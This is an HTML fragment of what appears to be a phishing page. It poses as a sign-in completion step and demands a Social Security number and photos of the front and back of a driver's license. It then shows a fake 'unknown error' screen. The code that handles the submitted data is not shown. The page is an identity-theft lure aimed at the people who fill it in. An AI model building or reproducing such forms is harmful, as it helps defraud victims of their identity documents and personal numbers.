      ...
      <div class="content-container">
        ...
        <main id="main" aria-labelledby="sr_page_title" class="form-container">
          ...
          <div class="form-fields">
            <div class="field-group">
              <div class="field text suggest">
                <label class="required" for="ssn">SSN</label>
                <input placeholder="Enter your social security number" required="required" type="text"
                  id="ssn">
              </div>
              <div class="field text suggest">
                <label class="required" for="ssn">Upload front of your State ID / Driver's License</label>
                <input required="required" type="file" accept="image/*" id="fileFront">
              </div>
              <div class="field text suggest">
                <label class="required" for="ssn">Upload back of your State ID / Driver's License</label>
                <input required="required" type="file" accept="image/*" id="fileBack">
              </div>
          </div>
          <div class="form-actions">
            <input type="button" value="Continue" class="btn btn-primary" onclick="processID(this)">
          </div>
                    ...
                    <div class="container">
                      <div class="content-container">
                        ...
                        <main id="main" aria-labelledby="sr_page_title" class="form-container">
                          <div class="form-header-access">
                            <h2>COMPLETE YOUR SIGN IN</h2>
                            <h3 style="color:red;">Unknown error occured, unable to completee sign in process</h3>
                          </div>
                        </main>
                      </div>
